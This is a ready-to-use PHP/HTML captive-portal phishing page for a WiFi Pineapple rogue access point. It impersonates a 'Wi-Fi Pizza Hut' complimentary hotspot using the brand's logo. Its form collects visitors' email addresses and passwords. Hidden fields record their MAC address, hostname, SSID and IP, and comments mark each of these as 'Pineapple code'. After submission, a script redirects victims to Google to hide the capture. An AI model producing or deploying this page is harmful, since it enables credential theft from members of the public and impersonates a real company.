<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
<script type="text/javascript"> <!-- Pineapple code start -->
      function redirect() {
        setTimeout(function() {
          window.location = "https://www.google.com/";
        }, 100);
      }
    </script> <!-- Pineapple code end -->
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="robots" content="noindex, nofollow">
<title>Wi-Fi Pizza Hut</title>
<link rel="apple-touch-icon" sizes="57x57" href="assets/img/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="assets/img/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="assets/img/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="assets/img/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="assets/img/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="assets/img/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="assets/img/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="assets/img/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon-16x16.png">
<link rel="manifest" href="assets/img/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="assets/img/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<!--[if IE]>
<style type="text/css">
.main_area {
   background:transparent; filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#7FFFFFFF,endColorstr=#7FFFFFFF); zoom: 1; -moz-border-radius: 0px 0px 0px 0px; -webkit-border-radius: 0px 0px 0px 0px;	border-radius: 0px 0px 0px 0px;	background-color: rgba(255,255,255,0.80);	padding:10px; margin-top:15px; min-width:280px; max-width:600px; border: solid 1px;
}
.timespan {
	background:transparent; filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#70000000,endColorstr=#70000000); zoom: 1; background-color: rgba(,); width:100%; z-index:50; float:left; position:relative; left:0px; top:0px; height:40px; font-family:Arial, Helvetica, sans-serif; font-size:px; color:; vertical-align:middle; padding:5px; display:inline-block;
}
</style>
<![endif]-->
<style type="text/css">
html, body {
    height:100%;
}
html {
    overflow: hidden;
}
body {
    overflow-y: scroll;
    -webkit-overflow-scrolling:touch;
}
.timespan {
width:100%; z-index:50;float:left; position:relative; left:0px; top:0px; height:40px; font-family:Arial, Helvetica, sans-serif; font-size:px; color:; background-color: rgba(,); vertical-align:middle; padding:5px; display:inline-block;
}
.SkipButtonPos {
z-index:999;

}
input, submit, button {box-sizing:border-box;-moz-box-sizing:border-box}

input[type='submit']
{
   -webkit-appearance: none;
   -moz-appearance: none;
   appearance: none;
}
.spacer {
    padding:4px;
}

.blank {background-color:#FFFFFF;}

.placeholder
{
  color: #888888;
}
BODY {
	background-repeat: no-repeat;
	background-position: center top;
	margin:0px;
	padding:0px;
    font-family : Arial, Helvetica, sans-serif;
}
.nameinput {
	font-family:Verdana, Geneva, sans-serif;
	font-size:12px;
	color:#333;}
.header1 { font-size: 1.4em;
}
.header2 { font-size: 0.7em;
}
.text { font-size:0.8em;
}



.app_url {text-shadow: -1px -1px 1px rgba(255,255,255,0.80), 1px -1px 1px rgba(255,255,255,0.80), -1px 1px 1px rgba(255,255,255,0.80), 1px 1px 1px rgba(255,255,255,0.80); padding-top:4px; padding-bottom-4px;}
.app_msg_area {height:154px; width:100%; position:fixed; bottom:0px; background-color:#717171;}
.app_android {width:100%; height:100%;}
.app_android_bg {background-image:url('"img/upload/pizzahutbg.jpg"'); background-position:center top; background-attachment:Fixed; background-repeat:no-repeat;  min-height:100%; -webkit-background-size:cover; -moz-background-size:cover; -o-background-size:cover; background-size:cover}
.app_android_logo {padding-top: 30px; max-width:250px; max-height:120px; height: auto; background-image:url('"img/upload/pizzahut_logo.png"'); background-repeat:no-repeat;}
.app_msg {width:100%; margin-top:1px; background-color:#eaeaea; text-align:left; height:50px;
background: -webkit-linear-gradient(rgba(255,255,255,1), rgba(180,180,180,1),rgba(220,220,220,1)); /*Safari 5.1-6*/
  background: -o-linear-gradient(rgba(255,255,255,1), rgba(180,180,180,1),rgba(220,220,220,1)); /*Opera 11.1-12*/
  background: -moz-linear-gradient(rgba(255,255,255,1), rgba(180,180,180,1),rgba(220,220,220,1)); /*Fx 3.6-15*/
  background: linear-gradient(rgba(255,255,255,1), rgba(180,180,180,1), rgba(220,220,220,1)); /*Standard*/}
.app_number {padding:4px 4px 4px 4px; display:inline-block; float:left;}
.app_android_msg_text { min-width:200px; max-width:80%; height:40px; padding-top:10px; padding-left:4px; font-family:Arial, Verdana, Geneva, sans-serif; font-size:15px; color:#000000; display:inline-block;}

.MainHeader{font-family:Arial,Verdana,Geneva,sans-serif;font-size:28px;font-weight:bold;color:#000000}
.SubHeader{font-family:Arial,Verdana,Geneva,sans-serif;font-size:16px;color:#000000}
.LgText{font-family:Arial,Verdana,Geneva,sans-serif;font-size:14px;color:#000000}
.SubText{font-family:Arial,Verdana,Geneva,sans-serif;font-size:12px;color:#000000}
.SmText{font-family:Arial,Verdana,Geneva,sans-serif;font-size:10px;color:#000000}

.TermsSep{display:inline-block;}
.Termsleft{margin-right:0px;display:inline-block;}
.Termscentre{margin-left:0px; margin-right:3px;display:inline-block;}
.Termsright{margin-left:0px;display:inline-block;}

.TC30{width:30%; background-color:rgba(,0.70);}
.TC40{width:40%; background-color:rgba(,0.70);}
.PadB5{padding-bottom:2px;padding-top:5px;}
.YD{display:inline-block; vertical-align: baseline; box-sizing: border-box; border-bottom:5px solid #ef3c42; padding-bottom:2px; border-right:1px solid #CCCCCC;}
.PP{display:inline-block; vertical-align: baseline; box-sizing: border-box; border-bottom:5px solid #ef3c42; padding-bottom:2px;}
.nsel{color:#000000 !important; text-decoration:none;}
.sel{color:#000000 !important; text-decoration:none;}
.selborder{border-bottom:5px solid #ef3c42;}

.Register {
	color:#ffffff; /* Text Colour */
	font-family:"Lucida Sans Unicode", "Lucida Grande", sans-serif, Verdana, Arial, Helvetica;
	font-size:16px;
	background-color: #00a6d3;
	border:0px solid #00a6d3; /* Border Colour */
	text-decoration:none;
	text-shadow:0px -1px 1px  #00a6d3;  /* Text Shadow Colour */
	cursor:pointer;
	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	border-radius:3px;
	width:100%;
	padding:8px 8px;
}
.Submit,.Submit2 {
	background-color:#ef3c42;
	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	border-radius:3px;
	border:0px solid #c2c2c2; /* Border Colour */
	display:inline-block;
	color:#ffffff; /* Text Colour */
	font-family:Arial, Verdana, Helvetica;
	font-size:18px;
	font-weight:bold;
	padding:7px 7px;
	text-decoration:none;
	text-shadow:0px 0px 0px #ef3c42;  /* Text Shadow Colour */
	cursor:pointer;
	width:100%;
}.Submit:hover,.Submit2:hover {
	background-color:#000000;
	cursor:pointer;
}.Submit:active,.Submit2:active {
	position:relative;
	top:1px;
	cursor:pointer;
}
.Register {
	background-color:#000000;
	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	border-radius:3px;
	border:0px solid #c2c2c2; /* Border Colour */
	display:inline-block;
	color:#ffffff; /* Text Colour */
	font-family:Arial, Verdana, Helvetica;
	font-size:18px;
	font-weight:bold;
	padding:7px 7px;
	text-decoration:none;
	text-shadow:0px 0px 0px #ef3c42;  /* Text Shadow Colour */
	cursor:pointer;
	width:100%;
}.Register:hover {
	background-color:#ef3c42;
	cursor:pointer;
}.Register:active {
	position:relative;
	top:1px;
	cursor:pointer;
}
.Continue, .SkipButton {
	-moz-box-shadow:inset 0px 1px 0px 0px ;
	-webkit-box-shadow:inset 0px 1px 0px 0px ;
	box-shadow:inset 0px 1px 0px 0px ;
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, ), color-stop(1, ) );
	background:-moz-linear-gradient( center top,  5%,  100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='', endColorstr='');
	background-color:;
	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	border-radius:3px;
	border:px solid ; /* Border Colour */
	display:inline-block;
	color:; /* Text Colour */
	font-family:Verdana, Arial, Helvetica;
	font-size:px;
	font-weight:bold;
	padding:px;
	text-decoration:none;
	text-shadow:0px -1px 1px ;  /* Text Shadow Colour */
	cursor:pointer;
}
.Continue:hover, .SkipButton:hover {
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, ), color-stop(1, ) );
	background:-moz-linear-gradient( center top,  5%,  100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='', endColorstr='');
	background-color:;
	cursor:pointer;
}
.Continue:active, .SkipButton:active {
	position:relative;
	top:1px;
	cursor:pointer;
}
.main {
max-width:100%;
}
.main_table {
	min-width:200px;
	max-width:550px;
	width:550px;
}
.main_area {
	-moz-border-radius: 0px 0px 0px 0px;
	-webkit-border-radius: 0px 0px 0px 0px;
	border-radius: 0px 0px 0px 0px;
	background-color: rgba(255,255,255,0.80);
	padding:0px;
	margin-top:15px;
	width:550px;
	
}
.input_table {
	padding:0px;
	width:94%;
}

.emailinput, .payopt, .vcode  {
width:100%;
border:none;
min-width:100%;
font-family:Verdana, Geneva, sans-serif;
font-size:12px;
background-color:#fefefe;
border:#dddddd solid 1px;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
border-radius: 4px;
padding-bottom:8px;
padding-top:8px;
padding-left:8px;
color:#333;
}
.paypal_options {float:left; display:inline-block; min-width:200px; width:100%}
.paypal {margin-top:10px; display:inline-block}
.paypal_button {float:left; display:inline-block; min-width:200px; margin-top:10px; width:100%}
.vcode{margin-bottom:10px;margin-top:10px;}


#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}


@media only screen and (max-width: 479px){

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:inline-block;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:none;}

.main_table {
	width:100%;
	max-width:100%;
}
.main_area {
	background-color: rgba(255,255,255,0.80);
	padding:0px;
	margin-top:5px;
	width:90%;}
.input_table {width:100%;padding:0 5px 5px 5px}
.main {width:100%;}
.emailinput {width:100%;}
.payOpt, .vcode {width:240px;}
.paypal_options {display:block; width:100%;}
.paypal_button {display:block; width:100%;}
}

@media only screen and (device-width: 768px) {
  /* For general iPad layouts */

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}

.main_table {
	min-width:200px;
	width:490px;
	max-width:490px;}
.input_table {/*
	min-width:200px;
	max-width:480px;
	width:480px;*/}
.main {width:500px;}
.main_area {width:500px;}
.emailinput, .payopt, .vcode  {width:480px;}
.logo {max-height:200px;}
}

@media only screen and (min-width: 480px) and (max-width: 767px) {
  /* 2nd smallest screen */

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}

.main_table {
	min-width:200px;
	width:460px;
	max-width:460px;
}
.main_area {
	width:470px;
}
.input_table {/*
	min-width:200px;
	max-width:460px;
	width:460px;*/
}
.main {width:470px;}
.emailinput, .payopt, .vcode {width:450px;}
}

@media only screen and (device-width: 768px) and (orientation: landscape), only screen and (device-width: 768px) and  (orientation:portrait) {
  /* rules for iPad in landscape orientation */

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}

.main_table {
	width:480px;
	max-width:480px;
}
.main_area {
	width:500px;
}
.input_table {/*
	width:480px;
	max-width:480px;*/
}
.main {
width:500px;
}
.emailinput, .payopt, .vcode  {width:480px;}
.logo {
 max-height:150px;
}
}

/* Tablet Portrait size to Tablet Landscape (devices and browsers) */
@media only screen and (min-width: 768px) and (max-width: 979px) {

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}

.main_table {
	width:480px;
	max-width:480px;
}
.main_area {
	width:480px;
}
.input_table {/*
	padding:0px;
	width:460px;
	max-width:460px;*/
}
.main {
width:480px;
}
.emailinput, .payopt, .vcode  {width:460px;}
}

@media only screen and (min-width: 1050px) {

#fb_txt_sm, #tw_txt_sm, #g_txt_sm, #in_txt_sm, #li_txt_sm, #fq_txt_sm {
  display:none;}
#fb_txt_lg, #tw_txt_lg, #g_txt_lg, #in_txt_lg, #li_txt_lg, #fq_txt_lg {
  display:inline-block;}

.main {
max-width:100%;
}
.main_table {
	min-width:200px;
	width:500px;
	max-width:500px;
}
.main_area {
	width:550px;
}
.input_table {/*
	min-width:200px;
        width:470px;
	max-width:470px;*/
}
.emailinput, .payopt, .vcode {width:470px;}
.paypal {margin-top:10px
}
.paypal_login {
float:right;margin-top:0px
}
}

@media \0screen {
  img {
  	width: auto; /* for ie 8 */
  }
}
</style>
<style>
.placeholder{ color: #aaa;}
</style>

</head>

<body bgcolor="#ffffff" style="background-image:url('assets/img/pizzahutbg.jpg'); background-position:center top; background-attachment:Fixed; background-repeat:no-repeat;   min-height:100%; -webkit-background-size:cover; -moz-background-size:cover; -o-background-size:cover; background-size:cover; " topmargin="0" marginheight="0" leftmargin="0" marginwidth="0" >

<div class="main" style="width:100%" align="center" >


<div id="pagecontent">

<img src="assets/img/spacer.png" width="1" height="1" style="padding:10px 0px 5px 0px;" />


<div class="main_area">

<div style="max-width:100%;height:auto; text-align:center; background-color:">
<img src="assets/img/pizzahut_logo.png" class="logo" style="max-width:90%;max-height:180px;height:auto;padding:10px 0px 5px 0px;" alt="Wi-Fi pizzahuttt"></div>


<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin"> <!-- Pineapple Code --> 

 <table class="main_table" border="0" align="center" cellpadding="2" cellspacing="2">
 
  <tr>
   <td align="center" class="MainHeader">Complimentary Wi-Fi Service</td>
  </tr>
  <tr>
   <td align="center" class="SubText">Please enter your details below to register your account.</td>
  </tr>
  <tr>
    <td class="spacer"><img src="assets/img/spacer.gif" width="1" height="1" /></td>
   </tr>
  </table>
  <table cellpadding="0" cellspacing="0" border="0" align="center" class="input_table">
   
   <tr>
   <td align="left" width="100%">
   <div align="left">   
    
   <input type="email" name="email" class="emailinput emerror" placeholder="Email Address" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required="required"><br> <!-- Pineapple code -->
   </div></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/spacer.gif" width="1" height="4" /></td>
   </tr>
   
   <tr>
   <td>
   <div align="left">
   
   <input type="password" name="password" class="emailinput" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required="required"><br> <!--Pineapple code -->
   </div></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/spacer.gif" width="1" height="4" /></td>
   </tr>
   
   <tr>
   <td>
   
   
   <tr>
   <td align="left" colspan="3">
   <table width="100%" cellpadding="0" cellspacing="0">
    <tr>
    <td valign="top">
    <input name="Submit" type="submit" class="Submit" id="Submit" value="Continue" /></td>
			<input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>"> <!-- Pineapple Code Start -->
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
      <!-- Pineapple code End -->									

	</tr>
    </table></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/spacer.gif" width="1" height="1" /></td>
   </tr>
   <tr>
   <td colspan="3" align="left" class="SmText">
   <input type="checkbox" name="tnc" value="tnc" class="chkbox" id="chkbox" required /><label for="chkbox">
   I agree to the Terms and Conditions</label></td>
   </tr>
   <tr>
    <td class="spacer"><img src="assets/img/spacer.gif" width="1" height="1" /></td>
   </tr>
   
 </table>
 </form>
 



 
 <div class="input_table2" style="padding-top:10px; padding-bottom:10px;">
 

<div class="main" style="padding:10px 0px 0px 0px; text-align:center;box-sizing: border-box;">

<div id="YD" class="SmText YD TC30"  align="center">
<div class="SmText slide PadB5" align="center">
<a href="javascript:void(0);" id="sTYD" class="SmText nsel">Your Info</a></div></div><div id="TC" class="SmText YD TC40"  align="center">
<div class="SmText slide PadB5" align="center">
<a href="javascript:void(0);" id="sTTC" class="SmText nsel">Terms & Conditions</a></div></div><div id="PP" class="SmText PP TC30"  align="center">
<div class="SmText slide PadB5" align="center">
<a href="javascript:void(0);" id="sTPP" class="SmText nsel">Privacy Policy</a></div>
</div>

</div>
</div>
</div>
</div>


<div style="clear:both;"></div>
<div id="footer_spacer"><br /><br /><br /><br /><img src="assets/img/spacer.png" height="300" style="padding-top:300px; min-width:300px; width:100%; height:30px;" /></div>
</body>
</html>